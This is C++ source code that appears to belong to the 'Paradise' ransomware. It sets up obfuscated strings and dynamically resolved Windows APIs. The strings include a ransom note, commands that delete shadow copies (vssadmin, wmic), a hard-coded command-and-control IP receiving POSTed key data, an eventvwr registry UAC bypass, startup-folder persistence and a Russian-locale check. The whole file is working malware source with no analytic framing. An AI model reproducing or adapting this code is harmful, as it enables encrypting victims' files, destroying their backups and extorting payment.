#include "Api.h"



size_t _strlenA(char str[])
{
	 size_t len = 0;
	 for (; str[len]; ++len);
	 return len;
}

bool _isupper(char c)
{
	 return (c >= 'A' && c <= 'Z');
}

unsigned long PJWHash(const unsigned char *s)
{
	 unsigned long   h = 0, high;
	 while (*s)
	 {
		  h = (h << 4) + *s++;
		  if (high = h & 0xF0000000)
				h ^= high >> 24;
		  h &= ~high;
	 }
	 return h;
}


LPSTR GetEncryptKey()
{
	 /* Здесь я получаю строку "ntdll.dll" из peb, которой затем шифрую данные.
	 Чтобы понять все смещения, посмотри структуру _LDR_MODULE здесь:
	 https://github.com/conix-security/zer0m0n/blob/master/src/app/ntapi.h
	 Также можешь посмотреть PEB. */
	 wchar_t *wide_key = (wchar_t*)GlobalAlloc(GMEM_FIXED, 20);
	 __asm
	 {
		  mov eax, fs:[0x30] // peb
		  mov eax, [eax + 0xC] // peb.Ldr (check out PPEB struct)
		  mov eax, [eax + 0xC] // Ldr.InLoadOrderModuleList.Flink (first module = our executable image )
		  mov eax, [eax] // next module. I think that it's always ntdll.dll but I can be wrong (don't be angry if I).
		  mov eax, [eax + 0x30] // Ldr.BaseDllName.Buffer
		  mov wide_key, eax
	 }
	 char *multi_key = Mem::Utf16toUtf8(wide_key);
	 GlobalFree(wide_key);
	 for (size_t i = 0; multi_key[i]; ++i) // Приводим все буквы к нижнему регистру
		  if (_isupper(multi_key[i]))
				multi_key[i] += 32;
	 return multi_key;
}

char *UnEnc(char *enc, DWORD encLen)
{
#ifdef MAIN
	 static LPSTR key = GetEncryptKey();
	 char *startEnc = (char*)GlobalAlloc(GMEM_FIXED, encLen + 1);
	 startEnc[encLen] = 0;
	 for (UINT i = 0; i < encLen; ++i)
		  startEnc[i] = enc[i] ^ key[i % _strlenA(key)];
	 char* unEnc = &startEnc[1];
	 unEnc[_strlenA(unEnc) - 1] = 0;
	 return unEnc;
#else
	return NULL;
#endif
}

namespace Funcs
{
	 Types::T_RtlDecompressBuffer			pRtlDecompressBuffer;
	 Types::T_NtImpersonateThread			pNtImpersonateThread;
	 Types::T_NtQueryInformationThread	    pNtQueryInformationThread;
	 Types::T_RtlGetVersion					pRtlGetVersion;
	 Types::T_NtSetInformationProcess		pNtSetInformationProcess;
	 Types::T_RtlSetProcessIsCritical		pRtlSetProcessIsCritical;
	 Types::T_RtlAdjustPrivilege			    pRtlAdjustPrivilege;
	 Types::T_NtQueryInformationProcess      pNtQueryInformationProcess;
	 Types::T_fread							_fread;
	 Types::T_fclose							_fclose;
	 Types::T_fseek							_fseek;
	 Types::T_fopen							_fopen;
	 Types::T__stat64						stat64;
	 Types::T_srand						_srand;
	 Types::T_time							_time;
	 Types::T_rand							_rand;
};

namespace Strs
{
	 char *server;
	 char *version;


	 // dlls
	 char *msvcrt;

	 // funcs
	 char *ntQueryInformationProcess;
	 char *rtlDecompressBuffer;
	 char *ntImpersonateThread;
	 char *ntQueryInformationThread;
	 char *rtlGetVersion;
	 char *rtlAdjustPrivilege;
	 char *rtlSetProcessIsCritical;
	 char *ntSetInformationProcess;
	 char *Fseek;
	 char *Fopen;
	 char *Fread;
	 char *Fclose;
	 char *Stat64;
	 char *Srand;
	 char *Time;
	 char *Rand;


	 // sniffers
	 /*char *windump;
	 char *fiddler;
	 char *wireshark;
	 char *capsa;*/


	 // strings
	 char *readme;
	 char *nodeText;
	 char *vssadmin_cmd;
	 char *wmic;
	 char *wmic_cmd;
	 char *req_fmt;
	 char *delimiter;
	 char *base64_chars;
	 char *uac1;
	 char *uac2;
	 char *post;
	 char *russia;
	 char *open;
	 char *eventvwr_path;
	 char *key;
	 char *ip2;
	 char *content_type;
	 char *api_link;
	 char *info_fmt;
	 char *date_fmt;
	 char *firstMail;
	 char *secondMail;
	 char *image;
	 char *id;
	 char *guidfmt;
	 char *diskC;
	 char *autostartPath;
	 char *lnk;
	 char *trump;
	 char *paradise_key;
	 char *paradise_png;
	 char *paradise_sig;
	 char *keyName;
	 char *chromeFolder;
	 char *chrome;
	 char *firefoxFolder;
	 char *firefox;
	 char *iexploreFolder;
	 char *iexplore;
	 char *opera;
	 char *operaFolder;
	 char *eventvwr1;
	 char *eventvwr2;
	 char *publicKey;
	 char *cmd;
};

void InitApi()
{
	Strs::server = ENC_STR_A("146.185.241.35")END_ENC_STR;
	Strs::version = ENC_STR_A("_V.0.0.0.1")END_ENC_STR;

	Strs::ntQueryInformationProcess = ENC_STR_A("NtQueryInformationProcess")END_ENC_STR;
	Strs::rtlDecompressBuffer = ENC_STR_A("RtlDecompressBuffer")END_ENC_STR;
	Strs::ntImpersonateThread = ENC_STR_A("NtImpersonateThread")END_ENC_STR;
	Strs::ntQueryInformationThread = ENC_STR_A("NtQueryInformationThread")END_ENC_STR;
	Strs::rtlGetVersion = ENC_STR_A("RtlGetVersion")END_ENC_STR;
	Strs::ntSetInformationProcess = ENC_STR_A("NtSetInformationProcess")END_ENC_STR;
	Strs::rtlAdjustPrivilege = ENC_STR_A("RtlAdjustPrivilege")END_ENC_STR;
	Strs::rtlSetProcessIsCritical = ENC_STR_A("RtlSetProcessIsCritical")END_ENC_STR;
	Strs::Fseek = ENC_STR_A("fseek")END_ENC_STR;
	Strs::Fread = ENC_STR_A("fread")END_ENC_STR;
	Strs::Fclose = ENC_STR_A("fclose")END_ENC_STR;
	Strs::Fopen = ENC_STR_A("fopen")END_ENC_STR;
	Strs::Stat64 = ENC_STR_A("_stat64")END_ENC_STR;
	Strs::Srand = ENC_STR_A("srand")END_ENC_STR;
	Strs::Time = ENC_STR_A("time")END_ENC_STR;
	Strs::Rand = ENC_STR_A("rand")END_ENC_STR;


	/*Strs::windump = ENC_STR_A("windump.exe")END_ENC_STR;
	Strs::fiddler = ENC_STR_A("Fiddler.exe")END_ENC_STR;
	Strs::wireshark = ENC_STR_A("Wireshark.exe")END_ENC_STR;
	Strs::capsa = ENC_STR_A("capsa.exe")END_ENC_STR;*/

	Strs::readme = ENC_STR_A("PARADISE_README_")END_ENC_STR;
	Strs::nodeText = ENC_STR_A("To decrypt your files, please contact us by mail -- %s and %s\r\nYour user id: %s\r\n\r\n\r\n\r\n\r\nwith respect Ransomware Paradise Team");
	Strs::wmic = ENC_STR_A("wbem\\wmic.exe")END_ENC_STR;
	Strs::wmic_cmd = ENC_STR_A("shadowcopy delete")END_ENC_STR;
	Strs::vssadmin_cmd = ENC_STR_A("/c vssadmin delete shadows /all /quiet")END_ENC_STR;
	Strs::req_fmt = ENC_STR_A("POST /api/Encrypted.php HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: 146.185.241.35\r\nContent-Length: %d\r\n\r\n")END_ENC_STR;
	Strs::delimiter = ENC_STR_A("delimiter")END_ENC_STR;
	Strs::base64_chars = ENC_STR_A("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/")END_ENC_STR;
	Strs::ip2 = ENC_STR_A("www.2ip.ru")END_ENC_STR;
	Strs::russia = ENC_STR_A("Russian Federation")END_ENC_STR;
	Strs::open = ENC_STR_A("open")END_ENC_STR;
	Strs::eventvwr_path = ENC_STR_A("C:\\Windows\\System32\\eventvwr.exe")END_ENC_STR;
	Strs::content_type = ENC_STR_A("Content-Type: application/x-www-form-urlencoded")END_ENC_STR;
	Strs::info_fmt = ENC_STR_A("v1=%s&v2=%s&start_e=%s&end_e=%s&files_count=%d&key=")END_ENC_STR;
	Strs::api_link = ENC_STR_A("/api/Encrypted.php")END_ENC_STR;
	Strs::date_fmt = ENC_STR_A("%02d-%02d-%02d %d:%02d:%02d")END_ENC_STR;
	Strs::key = ENC_STR_A("%KEY%")END_ENC_STR;
	Strs::firstMail = ENC_STR_A("%FIRST_MAIL%")END_ENC_STR;
	Strs::secondMail = ENC_STR_A("%SECOND_MAIL%")END_ENC_STR;
	Strs::id = ENC_STR_A("%ID%")END_ENC_STR;
	Strs::image = ENC_STR_A("work.png")END_ENC_STR;
	Strs::autostartPath = ENC_STR_A("\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")END_ENC_STR;
	Strs::lnk = ENC_STR_A(".lnk")END_ENC_STR;
	Strs::trump = ENC_STR_A("trump")END_ENC_STR;
	Strs::paradise_png = ENC_STR_A("Paradise.png")END_ENC_STR;
	Strs::paradise_key = ENC_STR_A("paradise_key.bin")END_ENC_STR;
	Strs::paradise_sig = ENC_STR_A("PARADISE*")END_ENC_STR;
	Strs::iexploreFolder = ENC_STR_A("Internet Explorer")END_ENC_STR;
	Strs::operaFolder = ENC_STR_A("Opera")END_ENC_STR;
	Strs::iexplore = ENC_STR_A("iexplore.exe")END_ENC_STR;
	Strs::chromeFolder = ENC_STR_A("Google\\Chrome\\Application")END_ENC_STR;
	Strs::firefoxFolder = ENC_STR_A("Mozilla Firefox")END_ENC_STR;
	Strs::chrome = ENC_STR_A("chrome.exe")END_ENC_STR;
	Strs::firefox = ENC_STR_A("firefox.exe")END_ENC_STR;
	Strs::opera = ENC_STR_A("launcher.exe")END_ENC_STR;
	Strs::keyName = ENC_STR_A("paradise_key.bin")END_ENC_STR;
	Strs::eventvwr1 = ENC_STR_A("Software\\Classes\\mscfile")END_ENC_STR;
	Strs::eventvwr2 = ENC_STR_A("\\shell\\open\\command")END_ENC_STR;
	Strs::diskC = ENC_STR_A("C:\\")END_ENC_STR;
	Strs::guidfmt = ENC_STR_A("%08lX%04lX%lu")END_ENC_STR;
	Strs::publicKey = ENC_STR_A("paradise_key_pub.bin")END_ENC_STR;
	Strs::cmd = ENC_STR_A("cmd.exe")END_ENC_STR;
	Strs::post = ENC_STR_A("POST")END_ENC_STR;
	Strs::uac1 = ENC_STR_A("uac1")END_ENC_STR;
	Strs::uac2 = ENC_STR_A("uac2")END_ENC_STR;


	Strs::msvcrt = ENC_STR_A("msvcrt.dll")END_ENC_STR;

	HMODULE hNtdll = Utils::getNtdll();
	HMODULE hMsvcrt = LoadLibrary(Strs::msvcrt);

	Funcs::pNtQueryInformationProcess = (Types::T_NtQueryInformationProcess) Utils::getProcAddress(hNtdll, Strs::ntQueryInformationProcess);
	Funcs::pRtlDecompressBuffer = (Types::T_RtlDecompressBuffer)			   Utils::getProcAddress(hNtdll, Strs::rtlDecompressBuffer);
	Funcs::pNtImpersonateThread = (Types::T_NtImpersonateThread)			   Utils::getProcAddress(hNtdll, Strs::ntImpersonateThread);
	Funcs::pNtQueryInformationThread = (Types::T_NtQueryInformationThread)	   Utils::getProcAddress(hNtdll, Strs::ntQueryInformationThread);
	Funcs::pRtlGetVersion = (Types::T_RtlGetVersion)				   Utils::getProcAddress(hNtdll, Strs::rtlGetVersion);
	Funcs::pNtSetInformationProcess = (Types::T_NtSetInformationProcess)		   Utils::getProcAddress(hNtdll, Strs::ntSetInformationProcess);
	Funcs::pRtlSetProcessIsCritical = (Types::T_RtlSetProcessIsCritical)		   Utils::getProcAddress(hNtdll, Strs::rtlSetProcessIsCritical);
	Funcs::pRtlAdjustPrivilege = (Types::T_RtlAdjustPrivilege)			   Utils::getProcAddress(hNtdll, Strs::rtlAdjustPrivilege);
	Funcs::_fopen = (Types::T_fopen)						   Utils::getProcAddress(hMsvcrt, Strs::Fopen);
	Funcs::_fread = (Types::T_fread)						   Utils::getProcAddress(hMsvcrt, Strs::Fread);
	Funcs::_fseek = (Types::T_fseek)						   Utils::getProcAddress(hMsvcrt, Strs::Fseek);
	Funcs::_fclose = (Types::T_fclose)						   Utils::getProcAddress(hMsvcrt, Strs::Fclose);
	Funcs::stat64 = (Types::T__stat64)						   Utils::getProcAddress(hMsvcrt, Strs::Stat64);
	Funcs::_srand = (Types::T_srand) Utils::getProcAddress(hMsvcrt, Strs::Srand);
	Funcs::_time = (Types::T_time) Utils::getProcAddress(hMsvcrt, Strs::Time);
	Funcs::_rand = (Types::T_rand) Utils::getProcAddress(hMsvcrt, Strs::Rand);
}